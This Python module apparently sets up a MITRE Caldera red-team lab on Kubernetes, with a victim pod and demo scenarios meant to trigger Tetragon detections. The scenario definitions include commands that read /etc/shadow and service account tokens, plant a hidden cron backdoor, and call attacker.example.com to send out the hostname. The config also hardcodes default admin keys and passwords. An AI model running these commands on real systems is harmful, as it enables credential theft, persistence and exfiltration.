"""
Caldera C2 API helper.
All calls use the red-team API key (ADMIN123 by default).
"""
import os
import requests
from kubernetes import client, config
from kubernetes.client.exceptions import ApiException

CALDERA_URL = os.environ.get("CALDERA_URL", "http://caldera.piap.svc.cluster.local:8888")
API_KEY = os.environ.get("CALDERA_API_KEY", "ADMIN123")
NAMESPACE = "piap"
NAMESPACE_OLD = "caldera"  # previous broken namespace — cleaned up on deploy


def _core():
    config.load_incluster_config()
    return client.CoreV1Api()


def _apps():
    config.load_incluster_config()
    return client.AppsV1Api()

# ── Demo scenario definitions ─────────────────────────────────────────────────
# Each scenario becomes one Caldera adversary with N abilities (atomic steps).
DEMO_SCENARIOS = [
    {
        "adversary_name": "PoC: Recon & Discovery",
        "description": "Gather system info, enumerate processes and open ports.",
        "tactic_tag": "discovery",
        "tetragon_policies": ["detect-shell-execution", "detect-network-tool"],
        "abilities": [
            {
                "name": "PoC - System Info",
                "tactic": "discovery",
                "technique_id": "T1082",
                "technique_name": "System Information Discovery",
                "command": "whoami && hostname && id && uname -a",
            },
            {
                "name": "PoC - Process Enumeration",
                "tactic": "discovery",
                "technique_id": "T1057",
                "technique_name": "Process Discovery",
                "command": "ps aux | head -30",
            },
            {
                "name": "PoC - Network Discovery",
                "tactic": "discovery",
                "technique_id": "T1049",
                "technique_name": "System Network Connections Discovery",
                "command": "ss -tulpn 2>/dev/null || netstat -an 2>/dev/null | head -30",
            },
        ],
    },
    {
        "adversary_name": "PoC: Credential Hunting",
        "description": "Attempt to read sensitive credential files and Kubernetes secrets.",
        "tactic_tag": "credential-access",
        "tetragon_policies": ["detect-sensitive-file-read", "detect-k8s-secret-access"],
        "abilities": [
            {
                "name": "PoC - Read /etc/passwd",
                "tactic": "credential-access",
                "technique_id": "T1003",
                "technique_name": "OS Credential Dumping",
                "command": "cat /etc/passwd | head -20",
            },
            {
                "name": "PoC - Read /etc/shadow",
                "tactic": "credential-access",
                "technique_id": "T1003",
                "technique_name": "OS Credential Dumping",
                "command": "cat /etc/shadow 2>/dev/null && echo 'shadow read!' || echo 'shadow: permission denied'",
            },
            {
                "name": "PoC - Read K8s Service Account Token",
                "tactic": "credential-access",
                "technique_id": "T1528",
                "technique_name": "Steal Application Access Token",
                "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-80 || echo 'token not found'",
            },
        ],
    },
    {
        "adversary_name": "PoC: Persistence",
        "description": "Install a backdoor script, add a cron job, and attempt C2 callback.",
        "tactic_tag": "persistence",
        "tetragon_policies": ["detect-shell-execution"],
        "abilities": [
            {
                "name": "PoC - Drop Backdoor Script",
                "tactic": "persistence",
                "technique_id": "T1059",
                "technique_name": "Command and Scripting Interpreter",
                "command": "mkdir -p /tmp/.hidden && printf '#!/bin/sh\\nwhoami\\nhostname\\n' > /tmp/.hidden/back.sh && chmod +x /tmp/.hidden/back.sh && echo 'backdoor dropped'",
            },
            {
                "name": "PoC - Install Cron Persistence",
                "tactic": "persistence",
                "technique_id": "T1053.005",
                "technique_name": "Scheduled Task/Job: Cron",
                "command": "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.hidden/back.sh') | crontab - 2>/dev/null && echo 'cron installed' || echo 'cron failed'",
            },
            {
                "name": "PoC - C2 Callback Attempt",
                "tactic": "command-and-control",
                "technique_id": "T1071.001",
                "technique_name": "Application Layer Protocol: Web Protocols",
                "command": "curl -s --max-time 3 http://attacker.example.com/exfil?h=$(hostname) 2>/dev/null || echo 'c2 unreachable (expected)'",
            },
        ],
    },
]


def _headers():
    return {"KEY": API_KEY, "Content-Type": "application/json"}


def is_deployed():
    """Return True if the caldera Deployment exists in the cluster."""
    try:
        _apps().read_namespaced_deployment("caldera", NAMESPACE)
        return True
    except Exception:
        return False


def is_available():
    try:
        r = requests.get(f"{CALDERA_URL}/api/v2/agents", headers=_headers(), timeout=3)
        return r.status_code == 200
    except Exception:
        return False


def deploy_caldera():
    """
    Create (or idempotently re-apply) the Caldera C2 + victim pod resources:
      ConfigMap caldera-config, Deployment caldera, Service caldera,
      ConfigMap caldera-victim-script, Deployment caldera-victim,
      Headless Service caldera-victim (for DNS/ping monitoring).
    """
    core = _core()
    apps = _apps()

    # ── 0. Clean up stale caldera-namespace resources (frees nodePort 30600) ──
    for name, fn in [
        ("caldera", apps.delete_namespaced_deployment),
        ("caldera-victim", apps.delete_namespaced_deployment),
    ]:
        try:
            fn(name, NAMESPACE_OLD)
        except ApiException:
            pass
    for name in ["caldera", "caldera-config", "caldera-victim-script"]:
        try:
            core.delete_namespaced_config_map(name, NAMESPACE_OLD)
        except ApiException:
            pass
    for name in ["caldera", "caldera-victim"]:
        try:
            core.delete_namespaced_service(name, NAMESPACE_OLD)
        except ApiException:
            pass

    # ── 1. ConfigMap: caldera-config ────────────────────────────────────────
    local_yml = (
        "host: 0.0.0.0\n"
        "port: 8888\n"
        "app.contact.http: http://caldera.piap.svc.cluster.local:8888\n"
        "app.contact.html: /beacon\n"
        "app.contact.websocket: 0.0.0.0:7012\n"
        "api_key_red: ADMIN123\n"
        "api_key_blue: BLUEADMIN123\n"
        "users:\n"
        "  red:\n"
        "    admin: admin\n"
        "  blue:\n"
        "    admin: admin\n"
        "plugins:\n"
        "  - access\n"
        "  - debrief\n"
        "  - manx\n"
        "  - response\n"
        "  - sandcat\n"
        "  - stockpile\n"
        "crypt_salt: piap-demo-salt\n"
        "encryption_key: piap-demo-enc-key\n"
        "exfil_dir: /tmp/caldera\n"
        "reports_dir: /tmp\n"
    )
    cm_config = client.V1ConfigMap(
        metadata=client.V1ObjectMeta(name="caldera-config", namespace=NAMESPACE),
        data={"local.yml": local_yml},
    )
    try:
        core.create_namespaced_config_map(NAMESPACE, cm_config)
    except ApiException as e:
        if e.status == 409:
            core.patch_namespaced_config_map("caldera-config", NAMESPACE, cm_config)
        else:
            raise

    # ── 2. Deployment: caldera ───────────────────────────────────────────────
    caldera_dep = client.V1Deployment(
        metadata=client.V1ObjectMeta(
            name="caldera", namespace=NAMESPACE, labels={"app": "caldera"}
        ),
        spec=client.V1DeploymentSpec(
            replicas=1,
            selector=client.V1LabelSelector(match_labels={"app": "caldera"}),
            strategy=client.V1DeploymentStrategy(type="Recreate"),
            template=client.V1PodTemplateSpec(
                metadata=client.V1ObjectMeta(labels={"app": "caldera"}),
                spec=client.V1PodSpec(
                    restart_policy="Always",
                    containers=[client.V1Container(
                        name="caldera",
                        image="ghcr.io/mitre/caldera:5.2.0",
                        ports=[client.V1ContainerPort(container_port=8888)],
                        volume_mounts=[
                            client.V1VolumeMount(
                                name="caldera-config",
                                mount_path="/usr/src/app/conf/local.yml",
                                sub_path="local.yml",
                            ),
                            client.V1VolumeMount(
                                name="caldera-data",
                                mount_path="/usr/src/app/data",
                            ),
                        ],
                        resources=client.V1ResourceRequirements(
                            requests={"memory": "512Mi", "cpu": "250m"},
                            limits={"memory": "2Gi", "cpu": "1000m"},
                        ),
                    )],
                    volumes=[
                        client.V1Volume(
                            name="caldera-config",
                            config_map=client.V1ConfigMapVolumeSource(name="caldera-config"),
                        ),
                        client.V1Volume(
                            name="caldera-data",
                            host_path=client.V1HostPathVolumeSource(
                                path="/opt/caldera-data",
                                type="DirectoryOrCreate",
                            ),
                        ),
                    ],
                ),
            ),
        ),
    )
    try:
        apps.create_namespaced_deployment(NAMESPACE, caldera_dep)
    except ApiException as e:
        if e.status == 409:
            existing = apps.read_namespaced_deployment("caldera", NAMESPACE)
            caldera_dep.metadata.resource_version = existing.metadata.resource_version
            apps.replace_namespaced_deployment("caldera", NAMESPACE, caldera_dep)
        else:
            raise

    # ── 3. Service: caldera (NodePort 30600) ─────────────────────────────────
    try:
        core.delete_namespaced_service("caldera", NAMESPACE)
    except ApiException:
        pass  # not found — that's fine

    svc = client.V1Service(
        metadata=client.V1ObjectMeta(
            name="caldera", namespace=NAMESPACE, labels={"app": "caldera"}
        ),
        spec=client.V1ServiceSpec(
            type="NodePort",
            selector={"app": "caldera"},
            ports=[client.V1ServicePort(
                name="http", port=8888, target_port=8888, node_port=30600,
            )],
        ),
    )
    core.create_namespaced_service(NAMESPACE, svc)

    # ── 4. ConfigMap: caldera-victim-script ──────────────────────────────────
    victim_script = (
        "#!/bin/bash\n\n"
        "echo '[victim] Installing tools...'\n"
        "apt-get update -qq && apt-get install -y -qq curl wget iputils-ping netcat-openbsd file 2>/dev/null || true\n\n"
        "echo '[victim] Waiting for Caldera C2 to be ready...'\n"
        "until curl -sf --max-time 3 http://caldera.piap.svc.cluster.local:8888 > /dev/null 2>&1; do\n"
        "  echo '[victim] Caldera not ready, retrying in 15s...'\n"
        "  sleep 15\n"
        "done\n\n"
        "echo '[victim] Caldera is up — waiting for sandcat agent binary to be compiled...'\n"
        "while true; do\n"
        "  curl -s -X POST \\\n"
        "    -H 'file:sandcat.go-linux' \\\n"
        "    -H 'platform:linux' \\\n"
        "    http://caldera.piap.svc.cluster.local:8888/file/download \\\n"
        "    -o /tmp/sandcat\n\n"
        "  if [ -s /tmp/sandcat ] && file /tmp/sandcat | grep -q 'ELF'; then\n"
        "    echo '[victim] Agent binary downloaded successfully.'\n"
        "    break\n"
        "  else\n"
        "    echo '[victim] Agent binary not ready yet, retrying in 10s...'\n"
        "    rm -f /tmp/sandcat\n"
        "    sleep 10\n"
        "  fi\n"
        "done\n\n"
        "chmod +x /tmp/sandcat\n\n"
        "# Run the agent in a loop — reconnect on exit instead of letting\n"
        "# the container exit and trigger a Kubernetes restart.\n"
        "while true; do\n"
        "  echo '[victim] Connecting to C2 (group: red)...'\n"
        "  /tmp/sandcat -server http://caldera.piap.svc.cluster.local:8888 -group red -v || true\n"
        "  echo '[victim] Agent exited. Reconnecting in 30s...'\n"
        "  sleep 30\n"
        "done\n"
    )
    cm_victim = client.V1ConfigMap(
        metadata=client.V1ObjectMeta(name="caldera-victim-script", namespace=NAMESPACE),
        data={"start.sh": victim_script},
    )
    try:
        core.create_namespaced_config_map(NAMESPACE, cm_victim)
    except ApiException as e:
        if e.status == 409:
            core.patch_namespaced_config_map("caldera-victim-script", NAMESPACE, cm_victim)
        else:
            raise

    # ── 5. Deployment: caldera-victim ────────────────────────────────────────
    victim_dep = client.V1Deployment(
        metadata=client.V1ObjectMeta(
            name="caldera-victim", namespace=NAMESPACE, labels={"app": "caldera-victim"}
        ),
        spec=client.V1DeploymentSpec(
            replicas=1,
            selector=client.V1LabelSelector(match_labels={"app": "caldera-victim"}),
            strategy=client.V1DeploymentStrategy(type="Recreate"),
            template=client.V1PodTemplateSpec(
                metadata=client.V1ObjectMeta(labels={"app": "caldera-victim"}),
                spec=client.V1PodSpec(
                    restart_policy="Always",
                    containers=[client.V1Container(
                        name="victim",
                        image="ubuntu:22.04",
                        command=["/bin/bash", "/scripts/start.sh"],
                        volume_mounts=[client.V1VolumeMount(
                            name="victim-script",
                            mount_path="/scripts",
                        )],
                        resources=client.V1ResourceRequirements(
                            requests={"memory": "128Mi", "cpu": "50m"},
                            limits={"memory": "512Mi", "cpu": "250m"},
                        ),
                    )],
                    volumes=[client.V1Volume(
                        name="victim-script",
                        config_map=client.V1ConfigMapVolumeSource(
                            name="caldera-victim-script",
                            default_mode=0o755,
                        ),
                    )],
                ),
            ),
        ),
    )
    try:
        apps.create_namespaced_deployment(NAMESPACE, victim_dep)
    except ApiException as e:
        if e.status == 409:
            existing = apps.read_namespaced_deployment("caldera-victim", NAMESPACE)
            victim_dep.metadata.resource_version = existing.metadata.resource_version
            apps.replace_namespaced_deployment("caldera-victim", NAMESPACE, victim_dep)
        else:
            raise

    # ── 6. Headless Service: caldera-victim (for DNS / ping monitoring) ────
    victim_svc = client.V1Service(
        metadata=client.V1ObjectMeta(
            name="caldera-victim", namespace=NAMESPACE,
            labels={"app": "caldera-victim"},
        ),
        spec=client.V1ServiceSpec(
            cluster_ip="None",
            selector={"app": "caldera-victim"},
        ),
    )
    try:
        core.create_namespaced_service(NAMESPACE, victim_svc)
    except ApiException as e:
        if e.status == 409:
            core.patch_namespaced_service("caldera-victim", NAMESPACE, victim_svc)
        else:
            raise


def get_agents():
    r = requests.get(f"{CALDERA_URL}/api/v2/agents", headers=_headers(), timeout=5)
    r.raise_for_status()
    agents = r.json()

    # Group by host — keep only the most recently seen agent per host.
    # The victim pod re-registers a new PAW on every reconnect, leaving
    # stale entries that clutter the dashboard.
    by_host = {}
    for a in agents:
        if not a.get("trusted", False):
            continue
        host = a.get("host", "")
        last_seen = a.get("last_seen", "")
        if host not in by_host or last_seen > by_host[host].get("last_seen", ""):
            by_host[host] = a
    return list(by_host.values())


def cleanup_stale_agents():
    """Delete all untrusted (dead) agents from Caldera."""
    try:
        r = requests.get(f"{CALDERA_URL}/api/v2/agents", headers=_headers(), timeout=5)
        r.raise_for_status()
        agents = r.json()

        # Find the most recent agent per host
        latest_by_host = {}
        for a in agents:
            host = a.get("host", "")
            last_seen = a.get("last_seen", "")
            if host not in latest_by_host or last_seen > latest_by_host[host].get("last_seen", ""):
                latest_by_host[host] = a

        keep_paws = {a["paw"] for a in latest_by_host.values()}

        # Delete all agents except the latest per host
        deleted = 0
        for a in agents:
            if a["paw"] not in keep_paws:
                try:
                    requests.delete(
                        f"{CALDERA_URL}/api/v2/agents/{a['paw']}",
                        headers=_headers(), timeout=5,
                    )
                    deleted += 1
                except Exception:
                    pass
        return deleted
    except Exception:
        return 0


def get_adversaries():
    r = requests.get(f"{CALDERA_URL}/api/v2/adversaries", headers=_headers(), timeout=5)
    r.raise_for_status()
    return [a for a in r.json() if a.get("name") and a.get("adversary_id")]


def get_operations():
    r = requests.get(f"{CALDERA_URL}/api/v2/operations", headers=_headers(), timeout=5)
    r.raise_for_status()
    return r.json()


def run_operation(name, adversary_id, group="red"):
    payload = {
        "name": name,
        "adversary": {"adversary_id": adversary_id},
        "group": group,
        "auto_close": False,
        "state": "running",
    }
    r = requests.post(
        f"{CALDERA_URL}/api/v2/operations",
        headers=_headers(),
        json=payload,
        timeout=10,
    )
    r.raise_for_status()
    return r.json()


def stop_operation(op_id):
    payload = {"state": "stop"}
    r = requests.patch(
        f"{CALDERA_URL}/api/v2/operations/{op_id}",
        headers=_headers(),
        json=payload,
        timeout=5,
    )
    r.raise_for_status()
    return r.json()


# ── Demo adversary setup ──────────────────────────────────────────────────────

def _create_ability(ability_def):
    """Create a single ability and return its ID."""
    payload = {
        "name": ability_def["name"],
        "description": ability_def["name"],
        "tactic": ability_def["tactic"],
        "technique_id": ability_def["technique_id"],
        "technique_name": ability_def["technique_name"],
        "executors": [
            {
                "name": "sh",
                "platform": "linux",
                "command": ability_def["command"],
                "timeout": 60,
                "payloads": [],
                "uploads": [],
                "parsers": [],
                "cleanup": [],
                "variations": [],
                "additional_info": {},
            }
        ],
    }
    r = requests.post(
        f"{CALDERA_URL}/api/v2/abilities",
        headers=_headers(),
        json=payload,
        timeout=10,
    )
    r.raise_for_status()
    data = r.json()
    return data.get("ability_id") or data.get("id")


def _create_adversary(name, description, ability_ids):
    """Create an adversary from a list of ability IDs."""
    payload = {
        "name": name,
        "description": description,
        "atomic_ordering": ability_ids,
    }
    r = requests.post(
        f"{CALDERA_URL}/api/v2/adversaries",
        headers=_headers(),
        json=payload,
        timeout=10,
    )
    if r.status_code >= 400:
        raise RuntimeError(
            f"Caldera adversary API returned {r.status_code}: {r.text}"
        )
    return r.json()


def _cleanup_poc_artifacts():
    """Remove all PoC adversaries and abilities so setup can start fresh."""
    # Delete PoC adversaries
    for adv in get_adversaries():
        if adv.get("name", "").startswith("PoC:"):
            try:
                requests.delete(
                    f"{CALDERA_URL}/api/v2/adversaries/{adv['adversary_id']}",
                    headers=_headers(), timeout=5,
                )
            except Exception:
                pass

    # Delete PoC abilities
    try:
        r = requests.get(f"{CALDERA_URL}/api/v2/abilities", headers=_headers(), timeout=5)
        r.raise_for_status()
        for ab in r.json():
            if ab.get("name", "").startswith("PoC"):
                try:
                    requests.delete(
                        f"{CALDERA_URL}/api/v2/abilities/{ab['ability_id']}",
                        headers=_headers(), timeout=5,
                    )
                except Exception:
                    pass
    except Exception:
        pass


def setup_demo_adversaries():
    """
    Create the 3 PoC adversaries (and their abilities) in Caldera.
    Cleans up any previous PoC artifacts first to avoid duplicates.
    Returns a list of result messages.
    """
    # Always start fresh — removes duplicate abilities from failed attempts
    _cleanup_poc_artifacts()
    messages = []

    for scenario in DEMO_SCENARIOS:
        ability_ids = []
        for ab in scenario["abilities"]:
            aid = _create_ability(ab)
            ability_ids.append(aid)

        adv = _create_adversary(
            scenario["adversary_name"],
            scenario["description"],
            ability_ids,
        )
        messages.append(f"Created: {scenario['adversary_name']}")

    return messages


def get_demo_adversaries():
    """
    Return the 3 PoC adversary dicts if they exist in Caldera, else None for each.
    Result is a list parallel to DEMO_SCENARIOS.
    """
    all_adv = {a["name"]: a for a in get_adversaries()}
    result = []
    for scenario in DEMO_SCENARIOS:
        adv = all_adv.get(scenario["adversary_name"])
        result.append({
            "scenario": scenario,
            "adversary": adv,  # None if not yet created
        })
    return result
